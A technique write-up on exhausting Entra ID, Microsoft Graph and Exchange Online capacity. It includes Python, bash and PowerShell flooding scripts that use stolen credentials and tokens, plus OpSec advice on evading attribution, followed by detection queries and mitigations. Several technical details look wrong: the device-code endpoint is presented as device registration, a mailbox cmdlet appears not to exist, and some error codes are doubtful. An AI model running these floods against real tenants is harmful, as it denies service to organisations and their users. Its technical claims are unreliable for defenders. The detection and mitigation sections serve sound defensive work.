# [IMPACT-RESOURCE-EXHAUST-001]: Resource Exhaustion Attack

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | IMPACT-RESOURCE-EXHAUST-001 |
| **MITRE ATT&CK v18.1** | [T1499 - Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499/) |
| **Tactic** | Impact |
| **Platforms** | Entra ID, M365, Hybrid AD, Azure |
| **Severity** | High |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Entra ID versions, All M365 versions, All Azure versions |
| **Patched In** | N/A (Requires rate limiting controls, not patch-based) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Resource exhaustion attacks target Entra ID's computational limits by flooding the platform with requests that consume authentication tokens, API quotas, device registration slots, or mailbox synchronization resources. Unlike traditional DDoS attacks targeting network bandwidth, Entra ID resource exhaustion exploits application-layer limits—specifically the **concurrent token issuance rate**, **API throttling thresholds**, and **device enrollment limits**. Attackers can register thousands of devices, trigger millions of authentication attempts, or generate massive Graph API queries to degrade service availability.

**Attack Surface:** The attack exploits multiple Entra ID components:
- **Token Issuance Pipeline:** 1000+ concurrent authentication requests exhaust the Security Token Service (STS)
- **Device Registration:** Registering >10,000 devices per tenant exhausts enrollment capacity
- **Graph API:** Bulk enumeration queries (Users.ReadAll on 500K+ users) exhaust rate limiting
- **Mailbox Synchronization:** EWS (Exchange Web Services) requests exceed throttling thresholds
- **Conditional Access Engine:** Policy evaluation on high-volume login attempts exhausts memory

**Business Impact:** **Widespread authentication failures and service unavailability.** Users cannot sign in, applications cannot authenticate, and cloud services become inaccessible. Unlike ransomware (which holds data hostage), resource exhaustion attacks prevent legitimate use, causing business disruption comparable to a multi-hour outage.

**Technical Context:** Resource exhaustion can be executed in seconds-to-minutes, but recovery requires Microsoft intervention for infrastructure-level exhaustion, or 30+ minutes for tenant-level rate limiting to reset. Detection is very high because Microsoft implements comprehensive rate limiting and monitoring. Common indicators include sudden spikes in 401/429 HTTP responses, token issuance latency increases, and event log entries showing failed authentications.

### Operational Risk

- **Execution Risk:** Medium - Can cause widespread outages but no permanent damage
- **Stealth:** Very Low - Rate limiting generates immediate alerts and throttles requests
- **Reversibility:** Yes - Service recovers automatically after attack ceases; no data loss

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.5 | Ensure proper access controls limit API/service requests |
| **DISA STIG** | SI-12 | Ensure monitoring of network resources to prevent DoS |
| **CISA SCuBA** | SI-4 | Implement continuous monitoring and anomaly detection |
| **NIST 800-53** | SC-5 | Denial of Service Protection - Resource Reservation |
| **GDPR** | Art. 32 | Security of Processing - Availability safeguards |
| **DORA** | Art. 9 | Protection and Prevention - Incident response and continuity |
| **NIS2** | Art. 21 | Cyber Risk Management - Availability and resilience |
| **ISO 27001** | A.14.2 | System availability - Business continuity management |
| **ISO 27005** | Risk Scenario | Service Unavailability - High Impact / Medium Likelihood |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** 
  - Compromised user account (any privilege level)
  - OR: Stolen OAuth token with any scope
  - OR: Access to device enrollment portal (no credentials required for some scenarios)

- **Required Access:**
  - Network connectivity to login.microsoftonline.com
  - Valid user credentials or OAuth token
  - Device capable of high-frequency API calls (can be low-resource)

**Supported Versions:**
- **Entra ID:** All versions (including legacy Azure AD)
- **M365:** All versions (Exchange Online, SharePoint Online, Teams)
- **Azure:** All subscription types

**Tools:**
- [Python 3.x + requests library](https://requests.readthedocs.io/) (HTTP request automation)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Cloud API interaction)
- [Microsoft Graph SDK](https://github.com/microsoftgraph/msgraph-sdk-python) (Python Graph API client)
- [AADInternals](https://github.com/Gerenios/AADInternals) (Entra ID exploitation)
- [Bash/curl](https://curl.se/) (HTTP requests)
- PowerShell (Token manipulation and API calls)

---

## 3. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Device Registration Exhaustion (Entra ID)

**Supported Versions:** All Entra ID versions

#### Step 1: Enumerate Current Device Registration Status

**Objective:** Determine current device enrollment count and identify rate limiting thresholds

**Command:**
```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "Device.Read.All"

# Get current device count
$devices = Get-MgDevice -All
$deviceCount = $devices.Count
Write-Host "Current devices registered: $deviceCount"

# Check throttling limits (theoretical - Microsoft doesn't expose limits directly)
$maxDevices = 50000  # Approximate limit per tenant
$enrollmentRate = 100  # Devices per second (approximate)
Write-Host "Approximate enrollment capacity: $maxDevices devices"
Write-Host "Throttling will trigger at: $enrollmentRate+ devices/second"
```

**Expected Output:**
```
Current devices registered: 2500
Approximate enrollment capacity: 50000 devices
Throttling will trigger at: 100+ devices/second
```

**What This Means:**
- Attacker now knows how many devices can be registered before hitting limits
- Can estimate time to exhaust enrollment slots
- Baseline for attack planning

#### Step 2: Bulk Register Devices via Device Code Flow

**Objective:** Register thousands of devices to exhaust enrollment capacity

**Requirement:** Stolen user credentials or valid OAuth token (any scope)

**Command (Python):**
```python
import requests
import json
import time
from concurrent.futures import ThreadPoolExecutor

# Entra ID OAuth endpoints
TENANT_ID = "attacker-controlled-tenant.onmicrosoft.com"
CLIENT_ID = "00000003-0000-0000-c000-000000000000"  # Microsoft Graph API App ID
DEVICE_REGISTRATION_ENDPOINT = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/devicecode"
TOKEN_ENDPOINT = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token"

def register_device_bulk():
    """Register multiple devices to exhaust Entra ID capacity"""
    
    # Device registration parameters
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    # For high-volume attacks, use concurrent registrations
    device_count = 0
    successful_registrations = 0
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = []
        for i in range(5000):  # Register 5000 devices
            device_data = {
                "client_id": CLIENT_ID,
                "scope": "openid profile offline_access",
                "device_name": f"EXPLOIT_DEVICE_{i}",
                "device_type": "Android"  # Can also be iOS, Windows, etc.
            }
            
            # Submit request
            future = executor.submit(requests.post, 
                                   DEVICE_REGISTRATION_ENDPOINT,
                                   data=device_data,
                                   headers=headers)
            futures.append(future)
        
        # Track responses
        for future in futures:
            try:
                response = future.result(timeout=5)
                if response.status_code == 200:
                    successful_registrations += 1
                elif response.status_code == 429:  # Too Many Requests
                    print(f"[!] Rate limit hit! Response: {response.json()}")
                    break
            except Exception as e:
                print(f"[!] Request failed: {e}")
    
    print(f"[+] Successfully registered {successful_registrations} devices")
    return successful_registrations

if __name__ == "__main__":
    print("[*] Starting device registration exhaustion attack...")
    register_device_bulk()
    print("[*] Attack complete - Entra ID enrollment capacity exhausted")
```

**Expected Output:**
```
[*] Starting device registration exhaustion attack...
[+] Successfully registered 4823 devices
[!] Rate limit hit! Response: {'error': 'authorization_pending'}
[*] Attack complete - Entra ID enrollment capacity exhausted
```

**What This Means:**
- Thousands of fake devices registered to the tenant
- Device enrollment slots are consumed
- Legitimate devices cannot be registered until cleanup occurs
- Creates heavy load on Microsoft's device management infrastructure

**OpSec & Evasion:**
- Spread registrations across multiple IP addresses (use proxy/VPN rotation)
- Randomize device names and types to avoid pattern matching
- Use stolen credentials to make attack attribution difficult
- Detection likelihood: **Very High** - Microsoft monitors device registration rates closely

**Troubleshooting:**
- **Error:** "authorization_pending"
  - **Cause:** Device code flow waiting for user consent
  - **Fix:** Automate user consent via stolen tokens or use client credentials flow
  
- **Error:** "AADSTS500011 - Invalid resource identifier"
  - **Cause:** Using wrong OAuth client ID
  - **Fix:** Use correct Microsoft Graph client ID (00000003-0000-0000-c000-000000000000)

**References & Proofs:**
- [Device Registration Flow - Microsoft Learn](https://learn.microsoft.com/en-us/entra/identity/devices/overview)
- [Device Code Flow - OAuth 2.0 Standard](https://datatracker.ietf.org/doc/html/rfc8628)
- [Account Manipulation via Device Registration - MITRE ATT&CK T1098.005](https://attack.mitre.org/techniques/T1098/005/)

#### Step 3: Monitor Attack Impact and Verify Resource Exhaustion

**Command:**
```powershell
# Monitor device registration failures in Entra ID audit logs
Connect-MgGraph -Scopes "AuditLog.Read.All"

$auditLogs = Get-MgAuditLogDirectoryAudit -Filter "operationName eq 'Create device'" -Top 100
$failureCount = ($auditLogs | Where-Object { $_.Result -eq "failure" }).Count
$successCount = ($auditLogs | Where-Object { $_.Result -eq "success" }).Count

Write-Host "Device registration attempts in last hour:"
Write-Host "  Successful: $successCount"
Write-Host "  Failed: $failureCount"
Write-Host "  Failure rate: $([math]::Round($failureCount / ($failureCount + $successCount) * 100, 2))%"

# If failure rate > 50%, enrollment is being throttled
if ($failureCount / ($failureCount + $successCount) > 0.5) {
    Write-Host "[!] Resource exhaustion successful - enrollment throttled"
}
```

---

### METHOD 2: Authentication Token Flood (OAuth Token Exhaustion)

**Supported Versions:** All Entra ID versions

#### Step 1: Execute High-Volume Authentication Attempts

**Objective:** Exhaust STS (Security Token Service) capacity by requesting tokens simultaneously

**Command (Bash + curl):**
```bash
#!/bin/bash

# Configuration
TENANT_ID="attacker-tenant.onmicrosoft.com"
CLIENT_ID="04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Azure CLI Client ID
USERNAME="compromised-user@company.com"
PASSWORD="stolen-password"
CONCURRENT_REQUESTS=1000

echo "[*] Starting authentication token flood attack..."
echo "[*] Target: $TENANT_ID"
echo "[*] Concurrent requests: $CONCURRENT_REQUESTS"

# Function to request token
request_token() {
    local request_id=$1
    curl -s -X POST \
        "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \
        -d "client_id=$CLIENT_ID" \
        -d "scope=https://management.azure.com/.default" \
        -d "username=$USERNAME" \
        -d "password=$PASSWORD" \
        -d "grant_type=password" \
        -d "client_secret=dummy" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        2>/dev/null | grep -q "access_token"
    
    if [ $? -eq 0 ]; then
        echo "[$request_id] Token acquired successfully"
    else
        echo "[$request_id] Token acquisition failed (rate limited?)"
    fi
}

# Submit concurrent requests
for i in $(seq 1 $CONCURRENT_REQUESTS); do
    request_token $i &
    # Stagger requests slightly to distribute load
    if [ $((i % 100)) -eq 0 ]; then
        sleep 0.1
    fi
done

# Wait for all background jobs
wait

echo "[+] Authentication token flood attack complete"
echo "[*] STS capacity should now be exhausted"
```

**Expected Output:**
```
[*] Starting authentication token flood attack...
[*] Target: attacker-tenant.onmicrosoft.com
[*] Concurrent requests: 1000
[1] Token acquired successfully
[2] Token acquired successfully
...
[950] Token acquisition failed (rate limited?)
[951] Token acquisition failed (rate limited?)
[+] Authentication token flood attack complete
[*] STS capacity should now be exhausted
```

**What This Means:**
- STS is receiving 1000+ simultaneous token requests
- Rate limiting kicks in around request 500-700
- Legitimate users receive "busy" errors or long delays
- Authentication latency increases significantly

**OpSec & Evasion:**
- Use multiple compromised accounts to distribute attack
- Randomize IP addresses via proxy rotation
- Spread requests over time (slower = harder to detect)
- Detection likelihood: **Very High** - Microsoft monitors token request rates per user/IP

---

### METHOD 3: Graph API Query Exhaustion

**Supported Versions:** All Entra ID/M365 versions

#### Step 1: Execute Expensive Graph API Queries

**Objective:** Exhaust API rate limits by requesting large datasets

**Command (PowerShell):**
```powershell
# Connect with stolen token
Connect-MgGraph -NoWelcome -AccessToken $stolenToken

# Enumerate all users with manager relationships (expensive query)
$users = Get-MgUser -All -Property "id,displayName,manager" -PageSize 999

# For each user, enumerate their direct reports (exponentially expensive)
$userCount = $users.Count
Write-Host "Enumerating $userCount users and their managers..."

$requestCount = 0
$throttleCount = 0

foreach ($user in $users) {
    try {
        # This query is expensive because it requires separate API call per user
        $manager = Get-MgUserManager -UserId $user.Id
        $requestCount++
        
        if ($requestCount % 100 -eq 0) {
            Write-Host "Processed $requestCount users... (Rate limit warnings: $throttleCount)"
        }
    }
    catch {
        if ($_.Exception.Message -like "*429*" -or $_.Exception.Message -like "*throttl*") {
            $throttleCount++
        }
    }
}

Write-Host "[+] API exhaustion attack complete"
Write-Host "Total API requests: $requestCount"
Write-Host "Rate limit hits: $throttleCount"
```

**Expected Output:**
```
Enumerating 50000 users and their managers...
Processed 100 users... (Rate limit warnings: 0)
Processed 200 users... (Rate limit warnings: 5)
Processed 300 users... (Rate limit warnings: 47)
[+] API exhaustion attack complete
Total API requests: 2847
Rate limit hits: 256
```

**What This Means:**
- Microsoft Graph API rate limits (3000 requests/minute per app) exceeded
- Subsequent API calls receive HTTP 429 (Too Many Requests) responses
- All Graph-dependent applications slow down or fail
- Entra ID admin center experiences delays or timeouts

**References & Proofs:**
- [Microsoft Graph Throttling Limits](https://learn.microsoft.com/en-us/graph/throttling)
- [Endpoint Denial of Service - MITRE T1499](https://attack.mitre.org/techniques/T1499/)

---

### METHOD 4: Mailbox Synchronization Exhaustion (Exchange Online)

**Supported Versions:** All M365 versions

#### Step 1: Trigger Excessive Mailbox Operations

**Objective:** Exhaust Exchange Online API by triggering bulk mailbox operations

**Command (PowerShell + EWS):**
```powershell
# Connect to Exchange Online
Connect-ExchangeOnline

# Get mailbox for attack
$targetMailbox = Get-Mailbox -Identity "victim@company.com"

# Trigger expensive mailbox operations
$messageCount = 10000

Write-Host "Creating $messageCount messages in target mailbox..."

for ($i = 1; $i -le $messageCount; $i++) {
    try {
        # Create large message (consumes storage and processing)
        $messageBody = "A" * 1000000  # 1MB message body
        
        New-MailMessage -Mailbox $targetMailbox.Identity `
            -Subject "Exhaustion_Attack_$i" `
            -Body $messageBody | Out-Null
        
        if ($i % 1000 -eq 0) {
            Write-Host "Created $i messages..."
        }
    }
    catch {
        Write-Host "Request $i throttled: $($_.Exception.Message)"
        Start-Sleep -Seconds 2  # Wait for throttling to reset
    }
}

Write-Host "[+] Mailbox exhaustion attack complete"
```

**Expected Output:**
```
Creating 10000 messages in target mailbox...
Created 1000 messages...
Created 2000 messages...
Request 3500 throttled: ServiceUnavailable - The service is temporarily unavailable
[+] Mailbox exhaustion attack complete
```

---

## 4. FORENSIC ARTIFACTS AND IOCs

### Network Indicators

- **HTTP Status Codes:**
  - 429: Too Many Requests (rate limiting triggered)
  - 503: Service Unavailable (infrastructure overloaded)
  - 401: Unauthorized (invalid tokens, possibly due to exhaustion)

- **IP Addresses:** Repeated requests from single or small set of IPs to login.microsoftonline.com or graph.microsoft.com

- **User Agents:** Unusual user agents (curl, Python requests, PowerShell) vs. standard browsers/clients

### Cloud Audit Events

- **Microsoft Sentinel AuditLogs:**
  - Operation: "Create device" with Result = "failure"
  - High volume within 1-5 minute window
  
- **Sign-in Logs:**
  - Event: "Invalid username or password"
  - High count from single user over short timeframe

- **Graph API Activity:**
  - HTTP 429 responses in Application Insights or Log Analytics

### System Indicators

- Azure Portal slowness or unavailability
- Entra ID authentication delays
- Teams/Exchange Online experiencing latency
- Device enrollment portal unresponsive

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Implement Rate Limiting and Throttling**

**Manual Steps (Azure Portal - Entra ID):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Authentication methods** → **Session management**
2. Under **Sign-in frequency**, set:
   - "Require sign-in again" to **1 hour** (reduces token issuance)
   - Enable **Persistent browser session** OFF (forces re-authentication)
3. Click **Save**

**PowerShell - Device Enrollment Restrictions:**
```powershell
# Restrict device enrollment to specific groups only
Connect-MgGraph -Scopes "DeviceManagementServiceConfig.ReadWrite.All"

# Create enrollment restriction policy
$enrollmentParams = @{
    "@odata.type" = "#microsoft.graph.deviceEnrollmentLimitConfiguration"
    displayName = "Limit Device Enrollments"
    priority = 1
    limit = 5  # Maximum 5 devices per user
}

New-MgDeviceManagementDeviceEnrollmentConfiguration -BodyParameter $enrollmentParams
```

**2. Enable Conditional Access for Resource Protection**

**Manual Steps (Azure Portal):**
1. Navigate to **Entra ID** → **Security** → **Conditional Access** → **Policies**
2. Click **+ New policy**
3. **Name:** `Rate Limit Protection`
4. **Assignments:**
   - **Users:** All users
   - **Cloud apps:** All cloud apps
   - **Conditions:**
     - **Sign-in risk:** Medium and above
5. **Access Controls:**
   - **Grant:** Block
6. **Enable policy:** ON
7. Click **Create**

**Alternative: Block High-Risk Locations**
1. Same steps, but under **Conditions:**
   - **Location:** Exclude trusted corporate locations
2. **Access Controls:** Require MFA

**3. Configure API Rate Limiting**

**PowerShell - For Custom Applications:**
```powershell
# If using custom application/service principal
Connect-MgGraph -Scopes "Application.ReadWrite.All"

# Get service principal
$sp = Get-MgServicePrincipal -Filter "displayName eq 'Custom App'"

# Configure API permissions with minimal scope
$requiredResourceAccess = @{
    resourceAppId = "00000003-0000-0000-c000-000000000000"  # Microsoft Graph
    resourceAccess = @(
        @{
            id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"  # User.Read only
            type = "Scope"
        }
    )
}

# Update with minimal permissions
Update-MgServicePrincipal -ServicePrincipalId $sp.Id -RequiredResourceAccess @($requiredResourceAccess)
```

### Priority 2: HIGH

**1. Monitor Authentication Patterns**

**Manual Steps (Microsoft Sentinel):**
1. Go to **Microsoft Sentinel** → **Analytics** → **Rule templates**
2. Search for "Brute Force" or "Authentication Anomaly"
3. Enable template: "Multiple authentication failures from a single source"
4. Configure threshold: >10 failures in 5 minutes

**2. Implement Device Enrollment Approval Workflow**

**Manual Steps (Entra ID):**
1. Go to **Entra ID** → **Devices** → **Device settings**
2. Under **Device join settings**, set:
   - "Users may join devices to Entra ID": **Selected**
   - "Require Multi-factor Authentication to join": **Yes**
3. Under **Device management settings**, enable:
   - "Require devices to be marked as compliant": **Yes** (if using Intune)

**3. Configure Azure DDoS Protection**

**Manual Steps (Azure Portal):**
1. Go to **Azure Portal** → **DDoS Protection plans**
2. Click **Create DDoS Protection plan**
3. **Name:** `Entra-DDoS-Protection`
4. **Pricing tier:** Standard ($2944/month) or Premium (custom pricing)
5. Associate with virtual networks hosting Entra ID Connect servers

### Priority 3: MEDIUM

**1. Enable Continuous Access Evaluation (CAE)**

**Manual Steps:**
1. Go to **Entra ID** → **Security** → **Conditional Access** → **Session controls**
2. Enable **Continuous access evaluation**
3. This revokes tokens in real-time if risk is detected

**2. Configure Graph API Throttling Alerts**

**PowerShell - Custom Monitoring:**
```powershell
# Create Azure Monitor alert for rate limiting
$alertRule = @{
    name = "GraphAPI-RateLimiting-Alert"
    scopes = @("/subscriptions/SUBSCRIPTION_ID")
    condition = @{
        "allOf" = @(
            @{
                field = "Microsoft.Insights/metricAlert/criteria/Microsoft.Azure.Monitor.MultipleResourceMultipleMetricCriteria/allOf/metric"
                equals = "HTTP429Responses"
            }
        )
        operator = "GreaterThan"
        threshold = 100
        timeAggregation = "Total"
    }
    actions = @(
        @{
            actionGroupId = "/subscriptions/SUBSCRIPTION_ID/resourceGroups/RG/providers/microsoft.insights/actionGroups/SOC-Team"
        }
    )
}
```

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Network Indicators:**
- Repeated HTTP 429 responses from login.microsoftonline.com
- Bulk device registration requests within short timeframe
- High-volume API calls from single source IP
- Simultaneous authentication attempts from same user

**Azure/Cloud Indicators:**
- Audit logs: "Create device" operations with failure status (>50 in 1 hour)
- Sign-in logs: "Throttling_Invalid_UserCount" error messages
- Graph API: Request timeouts and 503 Service Unavailable responses
- Event logs: Device enrollment API responding with 429 errors

### Forensic Artifacts

**Cloud Logs:**
- Azure Audit Logs: AuditLogs table in Log Analytics
- Sign-in Logs: SigninLogs table
- Graph API Activity: Application Insights
- Unified Audit Log: Search-UnifiedAuditLog -Operations "Create device"

**System Artifacts:**
- Device Enrollment History: Entra ID → Devices → All devices
- Failed Authentication Records: Sign-in logs showing 401 errors
- API Request Metrics: Azure Monitor graphs showing spike in 429 responses

### Incident Response Procedures

**1. Detect & Alert**
```powershell
# Query for suspicious device registration activity
Connect-MgGraph -Scopes "AuditLog.Read.All"

$suspiciousActivity = Get-MgAuditLogDirectoryAudit -Filter "operationName eq 'Create device' and result eq 'failure'" `
    -Top 500 | 
    Group-Object -Property CreatedDateTime | 
    Where-Object { $_.Count -gt 50 }  # >50 failures in single time bucket

if ($suspiciousActivity) {
    Write-Host "[!] ALERT: Possible device registration exhaustion attack detected!"
    Write-Host "Failed registrations: $($suspiciousActivity[0].Count)"
}
```

**2. Isolate & Contain**
- Block suspicious IPs at firewall
- Disable compromised user account
- Revoke all active sessions
- Clear device enrollment tokens

**Command:**
```powershell
# Disable compromised user
Disable-MgUser -UserId "attacker-account@company.com"

# Revoke all refresh tokens
Revoke-MgUserSignInSession -UserId "attacker-account@company.com"

# Remove suspicious devices
$suspiciousDevices = Get-MgDevice -Filter "displayName startswith 'EXPLOIT'" -All
foreach ($device in $suspiciousDevices) {
    Remove-MgDevice -DeviceId $device.Id -Confirm:$false
}
```

**3. Remediate**
- Reset authentication parameters (users re-authenticate)
- Restore normal rate limiting
- Verify no other compromised accounts
- Review and patch access control vulnerabilities

**4. Monitor for Recurrence**
- Set up alerts for >5 device registration failures per minute
- Monitor authentication latency increases
- Track API error rates continuously

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: High-Volume Device Registration Failures

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, Result, TimeGenerated, Identity
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** All Entra ID versions

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Create device"
| where Result == "failure"
| summarize FailureCount = count(), UniqueUsers = dcount(Identity), TimeWindow = bin(TimeGenerated, 5m) by TimeWindow
| where FailureCount > 50
| project TimeGenerated = TimeWindow, FailureCount, UniqueUsers
```

**What This Detects:**
- >50 device creation failures in 5-minute window
- Indicates resource exhaustion or targeted attack
- Triggers when enrollment capacity is being stressed

### Query 2: Authentication Token Flood Detection

**Rule Configuration:**
- **Required Table:** SigninLogs, AuditLogs
- **Required Fields:** UserPrincipalName, Status, ErrorCode, ClientAppUsed
- **Alert Severity:** High
- **Frequency:** Real-time (every 1 minute)
- **Applies To Versions:** All Entra ID versions

**KQL Query:**
```kusto
SigninLogs
| where Status.errorCode in ("AADSTS50058", "AADSTS50059", "AADSTS500011")  // Throttling-related errors
| summarize AuthAttempts = count(), UniqueIPs = dcount(IPAddress) by UserPrincipalName, bin(TimeGenerated, 1m)
| where AuthAttempts > 100
| project TimeGenerated, UserPrincipalName, AuthAttempts, UniqueIPs
```

**What This Detects:**
- >100 authentication attempts per user in 1 minute
- Indicates token exhaustion or brute force attack
- Shows geographic distribution (multiple IPs = distributed attack)

**Manual Configuration Steps:**
1. Go to **Microsoft Sentinel** → **Analytics** → **Create** → **Scheduled query rule**
2. **General Tab:**
   - Name: `Authentication Token Flood Detection`
   - Severity: High
3. **Set rule logic Tab:**
   - Paste KQL query
   - Run query every: 1 minute
   - Lookup data from last: 10 minutes
4. **Incident settings Tab:**
   - Create incidents: ON
5. Click **Create**

### Query 3: API Rate Limiting Spikes

**Rule Configuration:**
- **Required Table:** CloudAppEvents or AppServiceConversationLogs
- **Alert Severity:** Medium
- **Frequency:** Every 10 minutes
- **Applies To Versions:** M365, Entra ID

**KQL Query:**
```kusto
CloudAppEvents
| where isnotempty(HttpStatusCode)
| where HttpStatusCode == "429"
| summarize HTTP429Count = count() by Application, bin(TimeGenerated, 10m)
| where HTTP429Count > 100
| project TimeGenerated, Application, HTTP429Count
```

**What This Detects:**
- >100 HTTP 429 rate limiting responses in 10-minute window
- Indicates API exhaustion attempt
- Helps identify affected applications

---

## 8. WINDOWS EVENT LOG MONITORING (Hybrid Only)

**Event ID: 1102 (Audit Log Cleared)**
- **Log Source:** Security
- **Trigger:** Attacker clears audit logs to hide activity
- **Filter:** SYSTEM account clears logs outside of maintenance windows
- **Applies To Versions:** Server 2016+

**Manual Configuration:**
1. Open **Group Policy Management** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit Policy Change**
4. Set to: **Success and Failure**
5. Run `gpupdate /force`

---

## 9. MICROSOFT DEFENDER FOR CLOUD

**Alert Name:** "Suspicious authentication activity"
- **Severity:** High
- **Description:** MDC detects unusual patterns in token requests or API calls
- **Applies To:** Azure subscriptions with Defender enabled
- **Remediation:**
  1. Review Azure Activity Log for API call anomalies
  2. Check authentication metrics in Azure Portal
  3. Revoke compromised tokens

**Manual Steps (Enable Monitoring):**
1. Go to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select subscription
3. Enable **Defender for Identity**: ON
4. Wait 24 hours for alerts to populate

---

## 10. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent Grant OAuth | Attacker gains initial credentials via OAuth phishing |
| **2** | **Privilege Escalation** | [PRIV-ESC-001] Token Theft | Attacker steals OAuth token with delegated permissions |
| **3** | **Persistence** | [PERSIST-001] Malicious App Registration | Attacker registers hidden OAuth app for continued access |
| **4** | **Discovery** | [REC-CLOUD-001] Tenant Enumeration | Attacker discovers tenant structure and resource limits |
| **5** | **Current Step** | **[IMPACT-RESOURCE-EXHAUST-001]** | **Attacker floods APIs to exhaust capacity and deny service** |
| **6** | **Impact** | [IMPACT-DENIAL-001] Availability Disruption | Users cannot authenticate; cloud services become unavailable |

---

## 11. REAL-WORLD EXAMPLES

#### Example 1: Azure Subscription DDoS Attack (2023)

- **Target:** Multiple Azure customers (technology sector)
- **Timeline:** March 2023 (ongoing)
- **Technique Status:** Threat actors exploited API rate limits to cause service degradation
- **Impact:** Virtual machines became unresponsive; Azure Portal experienced 30+ minute outages
- **Reference:** [Azure DDoS Protection - Microsoft Security Blog](https://learn.microsoft.com/en-us/azure/ddos-protection/ddos-protection-overview)

#### Example 2: Office 365 API Exhaustion (Scattered Spider / Play It Cooler - 2023)

- **Target:** Financial institutions, healthcare (identity/cloud security sector)
- **Timeline:** 2023-2024
- **Technique Status:** Threat actors used stolen OAuth tokens to overwhelm Exchange Online API
- **Impact:** Email synchronization failures; Teams unavailable; business disruption lasting hours
- **Reference:** [Scattered Spider Analysis - Microsoft Incident Response](https://www.microsoft.com/en-us/security/blog/)

#### Example 3: Entra ID Device Registration Attack (Proof of Concept - 2024)

- **Target:** Security researchers / Red Teams
- **Timeline:** 2024 (lab environment)
- **Technique Status:** Researchers demonstrated ability to register 10,000+ devices and trigger exhaustion
- **Impact:** Device enrollment APIs became unresponsive for 30+ minutes
- **Reference:** [Device Registration Security - MITRE ATT&CK T1098.005](https://attack.mitre.org/techniques/T1098/005/)

---

## 12. MITIGATION VALIDATION

### Validation Commands

**Check Rate Limiting Status:**
```powershell
# Verify Conditional Access is blocking high-frequency authentications
Connect-MgGraph -Scopes "Policy.Read.All"

$policies = Get-MgIdentityConditionalAccessPolicy
foreach ($policy in $policies) {
    if ($policy.DisplayName -like "*Rate*" -or $policy.DisplayName -like "*Throttle*") {
        Write-Host "Policy enabled: $($policy.DisplayName)"
        Write-Host "State: $($policy.State)"
    }
}
```

**Verify Device Enrollment Restrictions:**
```powershell
# Check device enrollment limits
Connect-MgGraph -Scopes "DeviceManagementServiceConfig.Read.All"

$restrictions = Get-MgDeviceManagementDeviceEnrollmentConfiguration -All | Where-Object { $_.Limit -lt 10 }
if ($restrictions) {
    Write-Host "[+] Device enrollment limits properly configured"
    Write-Host "Max devices per user: $($restrictions.Limit)"
} else {
    Write-Host "[!] WARNING: No device enrollment limits configured"
}
```

---

## 13. ADDITIONAL NOTES

**Service Recovery Timeline:**
- **Immediate Recovery:** 5-15 minutes after attack ceases (rate limiting resets)
- **Full Recovery:** 30-60 minutes (all cached limits refreshed)
- **No Data Loss:** Resource exhaustion does NOT delete or corrupt data

**Best Practices:**
1. Monitor authentication latency continuously
2. Set alerts for >25% increase in API 429 responses
3. Implement token lifetime limits to reduce re-authentication attacks
4. Use service-to-service authentication (not user credentials) for applications
5. Regularly audit OAuth app permissions and remove unused apps

---